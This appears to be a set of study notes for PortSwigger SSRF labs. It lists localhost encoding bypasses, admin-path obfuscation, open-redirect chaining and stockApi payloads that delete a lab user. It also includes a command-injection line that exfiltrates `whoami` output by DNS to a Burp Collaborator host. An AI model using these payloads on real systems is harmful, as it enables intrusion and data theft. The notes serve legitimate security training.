- [ ] **

- Partial URLs in requests - only a hostname or part of a URL path into request parameters. The value submitted is then incorporated server-side into a full URL that is requested.
- URLs within data formats - transmit data in formats with a specification that allows the inclusion of URLs that might get requested by the data parser for the format. An obvious example of this is the XML data format
- SSRF via the Referer header - Some applications use server-side analytics software to tracks visitors. This software often logs the Referer header in requests, so it can track incoming links
- Type in http://2130706433 instead of http://127.0.0.1
- Hex Encoding 127.0.0.1 translates to 0x7f.0x0.0x0.0x1
- Octal Encoding 127.0.0.1 translates to 0177.0.0.01
- Mixed Encoding 127.0.0.1 translates to 0177.0.0.0x1
- https://h.43z.one/ipconverter/
- Referer: [https://burp_id.oastify.com](https://burp_id.oastify.com)
- Experiment with different forms of localhost: e.g.: Use an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.

For the /admin page, obfuscation, e.g. case variation has worked i.e. Admin (but other variations also work) 

Can also do: Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.

stockApi=http://127.1/Admin/delete?username=carlos

- Find that thereis a next product endpoint that takes the user to the next endpoint

Use the stock check endpoint to generate an open redirect:

/product/nextProduct?path=http://192.168.0.12:8080/admin

stockApi=%2Fproduct%2FnextProduct?currentProductId53D1%26path%3Dhttp%3A%2F%2F192.168.0.12:8080%2Fadmin%2Fdelete?username=carlos  
  

stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2f192.168.0.12%253a8080%2fadmin

  
In this lab they state the admin interface is at http://192.168.0.12:8080/admin but in exam use the localhost:6566.

  
  

- csrf=g77ACC4XXneXU3BiTycokWw9etu55S33&name=Test&email=||nslookup+`whoami`.burp_collaborator.oastify.com||&subject=Test&message=Test
- Identify the SSRF in the stockAPI parameter, and bypass the block by changing the URL target localhost and admin endpoint to: http://127.1/%2561dmin
